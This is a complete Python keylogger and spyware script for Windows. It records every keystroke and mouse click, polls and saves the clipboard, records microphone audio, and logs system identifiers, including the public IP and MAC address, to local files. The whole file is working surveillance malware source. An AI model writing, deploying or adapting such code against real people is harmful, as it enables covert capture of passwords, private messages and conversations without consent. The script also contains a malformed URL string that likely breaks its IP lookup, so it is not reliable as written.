# -*- coding: utf-8 -*-
import logging
import requests
import threading
import pyaudio
import wave
import win32clipboard
import time

from pynput import keyboard, mouse
from pynput.keyboard import Key, Listener
import platform, socket, re, uuid, json, psutil


LOG_FILE = "keylogfile.txt"
CLIPBOARD = "clipboard.txt"
CHUNK = 4096
FORMAT = pyaudio.paInt32
CHANNELS = 2
RATE = 48000
WAVE_OUTPUT_FILENAME = "output.wav"

audio = pyaudio.PyAudio()
stop_audio_thread = threading.Event()

def setup_logging():
    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")

def get_system_info():
    info = {}
    try:
        response = requests.get('\n https://ipinfo.io/ip')
        info['Public IP Address'] = response.text.strip()
    except requests.RequestException as e:
        info['Public IP Address'] = f"Unable to get the Public IP Address: {str(e)}"
    
    info['System'] = f"{platform.system()} {platform.version()}"
    info['Architecture'] = platform.machine()
    info['Hostname'] = socket.gethostname()
    info['Private IP Address'] = socket.gethostbyname(socket.gethostname())
    info['MAC Address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    info['Processor'] = platform.processor()
    info['RAM'] = f"{str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB"

    return info

def log_system_info():
    info = get_system_info()
    for key, value in info.items():
        logging.info(f"{key}: {value}")
    logging.info("LOGS : \n[Date Hour - 'Key' or 'Mouse Action']:")

def start_audio_recording():
    try:
        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)

            print("Audio recording started. Press 'Esc' to stop.")
            while not stop_audio_thread.is_set():
                data = stream.read(CHUNK)
                wf.writeframes(data)
        
        stream.stop_stream()
        stream.close()
    except Exception as e:
        logging.error(f"Error occurred while recording audio: {e}")
    finally:
        audio.terminate()

def clipboard():
    previous_clipboard_data = ""  # Store the previous clipboard content
    
    with open(CLIPBOARD, "a") as file:
        try:
            while not stop_audio_thread.is_set():
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                # Check if clipboard content has changed
                if pasted_data != previous_clipboard_data:
                    file.write("Clipboard Data : \n")
                    file.write(str(pasted_data) + "\n")
                    file.write("\n")
                    previous_clipboard_data = pasted_data
                
                # Add a small delay to avoid high CPU usage
                time.sleep(1)
        except Exception as e:
            file.write("\n Clipboard could not be copied: " + str(e) + "\n")


def on_press(key):
    logging.info(f"[Key Pressed] - {key}")

def on_release(key):
    if key == Key.esc:
        print("Stopping the script.")
        stop_audio_thread.set()
        return False

def on_click(button, pressed):
    if pressed:
        if button == mouse.Button.left:
            logging.info('[Mouse Click] - Left Click')
        elif button == mouse.Button.right:
            logging.info('[Mouse Click] - Right Click')
        elif button == mouse.Button.middle:
            logging.info('[Mouse Click] - Middle Click')

def main():
    try:
        setup_logging()
        log_system_info()

        clipboard_thread = threading.Thread(target=clipboard)
        audio_thread = threading.Thread(target=start_audio_recording)

        # Start threads
        clipboard_thread.start()
        audio_thread.start()

        with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener, mouse.Listener(on_click=on_click) as mouse_listener:
            print("Script started. Press 'Esc' to stop.")
            key_listener.join()
            mouse_listener.stop()

    except Exception as e:
        logging.exception(f"An error occurred: {str(e)}")
    finally:
        # Ensure audio is terminated and threads are joined
        stop_audio_thread.set()
        audio_thread.join()
        clipboard_thread.join()


if __name__ == "__main__":
    main()